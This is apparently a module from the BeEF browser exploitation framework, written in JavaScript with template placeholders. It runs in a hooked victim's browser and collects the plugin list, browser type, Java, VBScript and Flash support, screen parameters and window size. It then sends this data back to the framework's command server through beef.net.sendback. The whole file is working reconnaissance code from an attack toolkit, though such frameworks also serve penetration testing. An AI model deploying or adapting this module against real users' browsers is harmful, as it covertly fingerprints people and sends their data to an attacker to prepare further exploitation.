beef.execute(function() {

function serialize(_obj)
{
   // Let Gecko browsers do this the easy way
   if (typeof _obj.toSource !== 'undefined' && typeof _obj.callee === 'undefined')
   {
      return _obj.toSource();
   }

   // Other browsers must do it the hard way
   switch (typeof _obj)
   {
      // numbers, booleans, and functions are trivial:
      // just return the object itself since its default .toString()
      // gives us exactly what we want
      case 'number':
      case 'boolean':
      case 'function':
         return _obj;
         break;

      // for JSON format, strings need to be wrapped in quotes
      case 'string':
         return '\'' + _obj + '\'';
         break;

      case 'object':
         var str;
         if (_obj.constructor === Array || typeof _obj.callee !== 'undefined')
         {
            str = '[';
            var i, len = _obj.length;
            for (i = 0; i < len-1; i++) { str += serialize(_obj[i]) + ','; }
            str += serialize(_obj[i]) + ']';
         }
         else
         {
            str = '{';
            var key;
            for (key in _obj) { str += key + ':' + serialize(_obj[key]) + ','; }
            str = str.replace(/\,$/, '') + '}';
         }
         return str;
         break;

      default:
         return 'UNKNOWN';
         break;
	}
}

	var plugins = beef.browser.getPlugins();
	var browser_type = serialize(beef.browser.type());
    var java_enabled = (beef.browser.hasJava())? "Yes" : "No";
    var vbscript_enabled = (beef.browser.hasVBScript())? "Yes" : "No";
    var has_flash = (beef.browser.hasFlash())? "Yes" : "No";
    var screen_params = serialize(beef.browser.getScreenParams());
    var window_size = serialize(beef.browser.getWindowSize());
    beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'plugins='+plugins+'&java_enabled='+java_enabled+'&vbscript_enabled='+vbscript_enabled+'&has_flash='+has_flash+'&browser_type='+browser_type+'&screen_params='+screen_params+'&window_size='+window_size);
});